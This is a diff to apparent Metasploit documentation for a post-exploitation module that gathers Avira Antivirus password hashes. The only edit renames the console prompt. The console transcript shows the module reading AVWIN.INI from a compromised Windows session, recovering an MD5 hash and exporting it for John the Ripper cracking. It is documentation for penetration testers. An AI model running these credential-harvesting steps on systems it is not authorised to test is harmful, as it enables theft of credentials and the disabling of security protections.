@@ -29,12 +29,12 @@ To enable the password functionality, use the following instructions:
 ### Avira Antivirus 15.0.2009.1965 on Windows 10
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/avira_password 
-msf6 post(windows/gather/credentials/avira_password) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/avira_password 
+msf post(windows/gather/credentials/avira_password) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/avira_password) > set verbose true
+msf post(windows/gather/credentials/avira_password) > set verbose true
 verbose => true
-msf6 post(windows/gather/credentials/avira_password) > run
+msf post(windows/gather/credentials/avira_password) > run
 
 [*] Checking default location...
 [*] Found file at C:\ProgramData\Avira\Antivirus\CONFIG\AVWIN.INI
@@ -49,7 +49,7 @@ msf6 post(windows/gather/credentials/avira_password) > run
 ##### John
 
 ```
-msf6 post(windows/gather/credentials/avira_password) > creds
+msf post(windows/gather/credentials/avira_password) > creds
 Credentials
 ===========
 
@@ -57,7 +57,7 @@ host  origin        service  public  private                           realm  pr
 ----  ------        -------  ------  -------                           -----  ------------        ----------
       192.168.2.92                   C8059E2EC7419F590E79D7F1B774BFE6         Nonreplayable hash  Raw-MD5u
 
-msf6 post(windows/gather/credentials/avira_password) > creds -o /tmp/avira.jtr
+msf post(windows/gather/credentials/avira_password) > creds -o /tmp/avira.jtr
 [*] Wrote creds to /tmp/avira.jtr
 ```
 
